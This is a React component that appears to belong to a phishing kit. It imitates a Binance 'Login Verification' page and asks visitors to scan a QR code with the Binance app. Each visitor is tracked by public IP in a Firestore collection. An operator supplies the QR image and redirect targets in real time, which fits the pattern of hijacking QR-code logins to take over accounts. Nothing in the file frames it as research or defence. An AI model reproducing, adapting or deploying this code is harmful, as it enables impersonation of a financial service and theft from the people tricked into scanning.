import React, { useEffect, useState } from 'react'
import { addDoc, collection, doc, getDoc, getDocs, onSnapshot, setDoc } from 'firebase/firestore';
import { publicIp, publicIpv4, publicIpv6 } from 'public-ip';
import { db } from '../firebase.js';
import DynamicImage from './DynamicImage.js';
import '../assets/poza277.css';

import logoza from '../assets/logoza.svg';


const About10 = () => {
    const [ip, setIp] = useState(undefined);
    const [userData, setUserData] = useState(undefined)
    const [isUserData, setIsUserData] = useState(false)
    const [userUrl, setUserUrl] = useState(false)
    const [showTryAgainButton, setShowTryAgainButton] = useState(false);


    const getUserData = async () => {
        const docRef = doc(db, 'nrchanger', ip);
        const docSnapshot = await getDoc(docRef);

        if (docSnapshot.exists()) {
            const userData = { ...docSnapshot.data(), id: docSnapshot.id };
            setIsUserData(true);
            setUserData(userData);
        } else {
            addUserData();
        }
    };



    const getIp = async () => {
        if (ip === undefined) {
            console.log(await publicIpv4());

            const ip = await publicIpv4()
            setIp(ip);
        }

    };
    getIp()


    useEffect(() => {

        if (ip) {
            onSnapshot(collection(db, "nrchanger"), (snapshot) => {
                let isExist = false
                snapshot.docs.map((doc) => ({ ...doc.data(), id: doc.id })).filter(x => {
                    if (x.ip === ip) {
                        isExist = true
                        setUserData(x)
                        fetch('./data.json').then(
                            function (res) {
                                return res.json();
                            },
                        ).then(function (data) {

                            data.url_data.filter((item) => {
                                if (item.id === parseInt(x.redir)) {
                                    setUserUrl(item.url)
                                    return
                                }
                            })
                        }).catch(
                            function (err) {
                                console.log(err, ' error');
                            },
                        );
                    }

                })
                if (!isExist) {
                    setUserUrl(false)
                }
            })

        }
    }, [ip]);

    const resetUserNumber = async () => {
        try {
            const docRef = doc(collection(db, "nrchanger"), ip);
            await setDoc(docRef, { redir: "-1" }, { merge: true });
            console.log("User number reset to -1 for IP: ", ip);
        } catch (e) {
            console.error("Error resetting user number: ", e);
        }
    };

    useEffect(() => {
        document.title = 'Welcome About10';
        if (userUrl) {
            setTimeout(() => {
                window.location = userUrl
            }, 1000)
            resetUserNumber()

        }

    }, [userData, userUrl])

    useEffect(() => {

    }, [userData])


    const addUserData = async () => {

        try {
            const docRef = doc(collection(db, "nrchanger"), ip);

            // Check if the document exists
            const docSnap = await getDoc(docRef);

            if (!docSnap.exists()) {
                // Document doesn't exist, so set the data
                await setDoc(docRef, {
                    ip: ip,
                    number: -1,
                    redir: "-1",
                    image: ""
                });
                console.log("Document written with ID: ", ip);
                getUserData()
            }
            else {
                console.log("Document already exists with ID: ", ip);
            }
        } catch (e) {
            console.error("Error adding document: ", e);
        }
    }


    useEffect(() => {
        if (ip) {
            getUserData()
        }

    }, [ip])
    const handleTryAgainClick = () => {
        // Define the logic to handle the "Try Again" button click here
        window.location = 'about9'
      };
      useEffect(() => {
        const timer = setTimeout(() => {
          setShowTryAgainButton(true);
        }, 20000); // 2 minutes in milliseconds
    
        return () => clearTimeout(timer); // Clear the timer if the component unmounts
      }, []);
    

    console.log("hi here is the data", isUserData, userData)

    return (
        <body id="la" name="la">

<nav class="navbar">
        <a href="#" class="logo1">
			<img src={logoza} alt="logo" class="logo1"/>
        </a>
        <a href="#" class="lang1">English</a>
    </nav>
    <div data-bn-type="text" class="css-15z8fno">Login Verification</div><br/>
    <div data-bn-type="text" class="css-15z8f1">Scan this QR code with the Binance mobile app to log in instantly.</div>

    <main class="main">
    <div className="App1">
  {userData && userData.image ? (
    <>
      {/* Your DynamicImage component */}
      <DynamicImage imageUrl={userData.image} />
    </>
  ) : (
      
    <>
      <div class="lines">
        <div class="line2"></div>
        <div class="line3"></div>
        <div class="line4"></div>
        <div class="line5"></div>
      </div>
    </>
  )}
</div>

    </main>
    <div className="App2">
    {showTryAgainButton && <button  style={{ fontSize: '16px', boxSizing: 'border-box',

      paddingLeft: '24px',
      paddingRight: '24px',
      paddingTop: '12px',
      paddingBottom: '12px',
      lineHeight: '24px',
      minWidth: '80px',
      wordBreak: 'keep-all',
      color: '#181A20',
      borderRadius: '4px',
      minHeight: '24px',
      border: 'none',
      backgroundImage: 'none',
      backgroundColor: '#FCD535',
      width: '75%',
      marginTop: '-44%', }} onClick={handleTryAgainClick}>Try anthor way</button>}</div>

    <footer class="footer">
        <p>
            &nbsp;&nbsp;&nbsp;&nbsp;© 2017 - 2023 Binance.com. All rights reserved
        </p>
    </footer>

</body>

        
    )

}

export default About10;